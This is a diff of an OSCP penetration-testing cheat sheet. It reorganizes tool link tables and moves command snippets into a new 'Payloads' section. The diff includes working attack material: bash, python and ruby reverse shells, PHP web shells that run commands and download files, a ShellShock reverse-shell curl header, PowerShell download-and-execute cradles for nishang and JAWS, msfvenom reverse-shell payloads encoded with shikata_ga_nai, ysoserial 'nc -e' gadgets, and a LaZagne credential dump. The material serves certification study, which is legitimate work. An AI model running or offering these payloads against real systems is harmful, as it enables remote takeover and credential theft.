@@ -18,15 +18,17 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 | --- | --- |
 | Nmap | https://github.com/nmap/nmap |
 | Amass | https://github.com/OWASP/Amass |
+| pspy | https://github.com/DominicBreuker/pspy |
+| enum4linux | https://github.com/CiscoCXSecurity/enum4linux |
 | BloodHound | https://github.com/BloodHoundAD/BloodHound |
 | BloodHound Python | https://github.com/fox-it/BloodHound.py |
-| enum4linux | https://github.com/CiscoCXSecurity/enum4linux |
 
 ### Vulnerability Analysis
 | Tool | URL |
 | --- | --- |
 | Nuclei | https://github.com/projectdiscovery/nuclei |
 | Sparta | https://github.com/SECFORCE/sparta |
+| nikto | https://github.com/sullo/nikto |
 
 ### Web Application Analysis
 | Tool | URL |
@@ -44,6 +46,7 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 ### Database Assessment
 | Tool | URL |
 | --- | --- |
+| NoSQLMap | https://github.com/codingo/NoSQLMap |
 | sqlmap | https://github.com/sqlmapproject/sqlmap |
 
 ### Password Attacks
@@ -54,6 +57,11 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 | Kerbrute | https://github.com/ropnop/kerbrute |
 | CrackMapExec | https://github.com/byt3bl33d3r/CrackMapExec |
 | SprayingToolkit | https://github.com/byt3bl33d3r/SprayingToolkit |
+| John | https://github.com/openwall/john |
+| hashcat | https://hashcat.net/hashcat |
+| LaZagne | https://github.com/AlessandroZ/LaZagne |
+| mimikatz | https://github.com/gentilkiwi/mimikatz |
+| pypykatz | https://github.com/skelsec/pypykatz |
 | RsaCtfTool | https://github.com/Ganapati/RsaCtfTool |
 | Default Credentials Cheat Sheet | https://github.com/ihebski/DefaultCreds-cheat-sheet |
 
@@ -75,6 +83,9 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 | --- | --- |
 | Impacket | https://github.com/SecureAuthCorp/impacket |
 | lsassy | https://github.com/Hackndo/lsassy |
+| Rubeus | https://github.com/GhostPack/Rubeus |
+| printspoofer | https://github.com/dievus/printspoofer |
+| pth-toolkit | https://github.com/byt3bl33d3r/pth-toolkit |
 | Evil-WinRM | https://github.com/Hackplayers/evil-winrm |
 | Metasploit | https://github.com/rapid7/metasploit-framework |
 
@@ -83,38 +94,22 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 | --- | --- |
 | PEASS-ng | https://github.com/carlospolop/PEASS-ng |
 | LinEnum | https://github.com/rebootuser/LinEnum |
-| pspy | https://github.com/DominicBreuker/pspy |
+| JAWS | https://github.com/411Hall/JAWS |
 | Watson | https://github.com/rasta-mouse/Watson |
 | WESNG | https://github.com/bitsadmin/wesng
-| Sherlock | https://github.com/sherlock-project/sherlock |
-| nishang | https://github.com/samratashok/nishang |
-| Shikata Ga Nai | https://github.com/EgeBalci/sgn |
-| Empire | https://github.com/BC-SECURITY/Empire |
-| LaZagne | https://github.com/AlessandroZ/LaZagne |
+| Sherlock | https://github.com/rasta-mouse/Sherlock |
 | GTFOBins | https://gtfobins.github.io/ |
 | LOLBAS | https://lolbas-project.github.io/ |
+| scavenger | https://github.com/SpiderLabs/scavenger |
 | powercat | https://github.com/besimorhino/powercat |
 | PowerView | https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 |
-| mimikatz | https://github.com/gentilkiwi/mimikatz |
-| pypykatz | https://github.com/skelsec/pypykatz |
-| Rubeus | https://github.com/GhostPack/Rubeus |
-| unicorn | https://github.com/trustedsec/unicorn |
-| printspoofer | https://github.com/dievus/printspoofer |
 | GenericPotato | https://github.com/micahvandeusen/GenericPotato |
 | Juicy Potato | https://github.com/ohpe/juicy-potato |
 | Rotten Potato | https://github.com/breenmachine/RottenPotatoNG |
-| JAWS | https://github.com/411Hall/JAWS |
-| Ping Castle | https://github.com/vletoux/pingcastle |
-| Active Directory Kill Chain Attack & Defense | https://github.com/infosecn1nja/AD-Attack-Defense |
 | Windows-privesc-check | https://github.com/pentestmonkey/windows-privesc-check |
 | Windows Privilege Escalation | https://github.com/frizb/Windows-Privilege-Escalation |
 | Windows Privilege Escalation Fundamentals | https://www.fuzzysecurity.com/tutorials/16.html |
-| Windows Exploits | https://github.com/SecWiki/windows-kernel-exploits |
-| Pre-compiled Windows Exploits | https://github.com/abatchy17/WindowsExploits |
-| static-binaries | https://github.com/andrew-d/static-binaries |
 | SeBackupPrivilege | https://github.com/giuliano108/SeBackupPrivilege |
-| AMSI.fail | http://amsi.fail/ |
-| Raikia's Hub | https://raikia.com/tool-powershell-encoder/ |
 
 ### CVEs
 | CVE | URL |
@@ -152,6 +147,27 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 | mona | https://github.com/corelan/mona |
 | Ropper | https://github.com/sashs/Ropper |
 | Buffer Overflow | https://github.com/gh0x0st/Buffer_Overflow |
+
+### Payloads
+| Resource | URL |
+| --- | --- |
+| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
+| Payload Box | https://github.com/payloadbox |
+| ysoserial | https://github.com/frohoff/ysoserial |
+| nishang | https://github.com/samratashok/nishang |
+| Shikata Ga Nai | https://github.com/EgeBalci/sgn |
+| charlotte | https://github.com/9emin1/charlotte |
+| Chimera | https://github.com/tokyoneon/Chimera |
+| unicorn | https://github.com/trustedsec/unicorn |
+| Mortar Loader | https://github.com/0xsp-SRD/mortar |
+| PowerLine | https://github.com/fullmetalcache/powerline |
+| TheFatRat | https://github.com/Screetsec/TheFatRat |
+| woodpecker | https://github.com/woodpecker-appstore/log4j-payload-generator |
+| marshalsec | https://github.com/mbechler/marshalsec |
+| AMSI.fail | http://amsi.fail |
+| Raikia's Hub | https://raikia.com/tool-powershell-encoder/ |
+| Web-Shells | https://github.com/TheBinitGhimire/Web-Shells |
+| PHP-Reverse-Shell | https://github.com/ivan-sincek/php-reverse-shell|
 
 ### Wordlists
 | Tool | URL |
@@ -311,6 +327,10 @@ sslyze --heartbleed <remote_ip>
 ```c
 nbtscan <remote_ip>
 enum4linux -a <remote_ip>
+```
+#### JAWS
+```c
+IEX(New-Object Net.webclient).downloadString('http://<local_ip>:<local_port>/jaws-enum.ps1')
 ```
 
 ### Vulnerability Analysis
@@ -747,13 +767,6 @@ wpscan --url https://<remote_ip> --disable-tls-checks --enumerate u
 target=<remote_ip>; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum
 wpscan --url http://<remote_ip> -U <user> -P passwords.txt -t 50
 ```
-#### ysoserial
-```c
-java -jar ysoserial-master-SNAPSHOT.jar
-java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections1 'nc <local_ip> <local_port> -e /bin/sh' | base64 -w 0
-java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
-java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections4 "$jex" > /tmp/$filename.session
-```
 
 ### Database Analysis
 #### Basic Commands:
@@ -839,6 +852,10 @@ test' or 1=2 or 'a'='a
 ```c
 fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <file>.zip
 ```
+#### LaZagne
+```c
+laZagne.exe all
+```
 #### Hydra
 ```c
 export HYDRA_PROXY=connect://127.0.0.1:8080
@@ -889,17 +906,9 @@ getTGT.py <domain>.local/<user> -dc-ip <domain>.local -hashes aad3b435b51404eeaa
 secretsdump.py <domain>/<user>@<remote_ip>
 secretsdump.py -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
 ```
-#### Web Shells
+#### ShellShock
 ```c
-/usr/share/webshells
-<?php echo shell_exe(($_GET['cmd']); ?>
-
-<?php echo "test";?>
-<?php system($_GET['cmd']);?>
-
-<?php file_put_contents($_GET['upload'], file_get_contents("http://<local_ip>:<local_port>/" . $_GET['upload']); ?>
-
-<?php if (isset($_GET['upload'])) {file_put_contents($_GET['upload'], file_get_contents("http://<local_ip>:<local_port>/" . $_GET['upload'])); }; if (isset($_GET['cmd'])) { system($_GET['cmd']); };?>
+curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<local_ip>/<local_port> 0>&1' http://<remote_ip>/cgi-bin/user.sh
 ```
 
 ### Post Exploitation
@@ -976,10 +985,6 @@ grep -R db_passwd
 grep -roiE "password.{20}"
 grep -oiE "password.{20}" /etc/*.conf
 ```
-#### JAWS
-```c
-IEX(New-Object Net.webclient).downloadString('http://<local_ip>:<local_port>/jaws-enum.ps1')
-```
 #### Juicy Potato
 ```c
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -b "\x00\x0a" -a x86 --platform windows -f exe -o exploit.exe
@@ -991,22 +996,6 @@ msf6 exploit(multi/handler) > set LPORT <local_ip>
 msf6 exploit(multi/handler) > run
 
 .\exploit.exe
-```
-#### LaZagne
-```c
-laZagne.exe all
-```
-#### nishang
-```c
-cd path/to/nishang/Shells/
-cp Invoke-PowerShellTcp.ps1 Invoke-PowerShellTcp.ps1
-
-tail -3 Invoke-PowerShellTcp.ps1
-}
-
-Invoke-PowerShellTcp -Reverse -IPAddress <local_ip> -Port <local_port>
-
-powershell "IEX(New-Object Net.Webclient).downloadString('http://<local_ip>:<local_port>/Invoke-PowerShellTcp.ps1')"
 ```
 #### Powershell & Powercat
 ```c
@@ -1027,16 +1016,6 @@ powershell -c "Invoke-Webrequest -Uri \"http://<local_ip>:<local_port>/shell.exe
 <remote_ip>/node/3?cmd=powershell -c IEX(New-object System.net.webclient).DownloadString('http://<local_ip>:<local:port>/Sherlock.ps1');Find-AllVulns
 
 echo "IEX (New-object System.net.webclient).DownloadString('http://<local_ip>:<local_port>/shell.ps1')" | powershell -noprofile -
-```
-#### ShellShock
-```c
-curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<local_ip>/<local_port> 0>&1' http://<remote_ip>/cgi-bin/user.sh
-```
-#### Shikata Ga Nai
-```c
-msfvenom -p windows/shell_reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
-
-msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/shell.exe
 ```
 #### Windows Tasks & Services
 ```c
@@ -1060,6 +1039,8 @@ wmic qfe get Caption,Description,HotFixID,InstalledOn    # no new patches - KEXP
 /dev/shm
 /tmp
 ```
+
+### Payloads
 #### Reverse Shells
 ```c
 bash -i >& /dev/tcp/<local_ip>/<local_port> 0>&1
@@ -1079,6 +1060,43 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<local_ip>",<local_port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 ruby -rsocket -e'f=TCPSocket.open("<local_ip>",<local_port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+```
+#### Web Shells
+```c
+/usr/share/webshells
+<?php echo shell_exe(($_GET['cmd']); ?>
+
+<?php echo "test";?>
+<?php system($_GET['cmd']);?>
+
+<?php file_put_contents($_GET['upload'], file_get_contents("http://<local_ip>:<local_port>/" . $_GET['upload']); ?>
+
+<?php if (isset($_GET['upload'])) {file_put_contents($_GET['upload'], file_get_contents("http://<local_ip>:<local_port>/" . $_GET['upload'])); }; if (isset($_GET['cmd'])) { system($_GET['cmd']); };?>
+```
+#### nishang
+```c
+cd path/to/nishang/Shells/
+cp Invoke-PowerShellTcp.ps1 Invoke-PowerShellTcp.ps1
+
+tail -3 Invoke-PowerShellTcp.ps1
+}
+
+Invoke-PowerShellTcp -Reverse -IPAddress <local_ip> -Port <local_port>
+
+powershell "IEX(New-Object Net.Webclient).downloadString('http://<local_ip>:<local_port>/Invoke-PowerShellTcp.ps1')"
+```
+#### Shikata Ga Nai
+```c
+msfvenom -p windows/shell_reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
+
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/shell.exe
+```
+#### ysoserial
+```c
+java -jar ysoserial-master-SNAPSHOT.jar
+java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections1 'nc <local_ip> <local_port> -e /bin/sh' | base64 -w 0
+java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
+java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections4 "$jex" > /tmp/$filename.session
 ```
 
 ### Templates
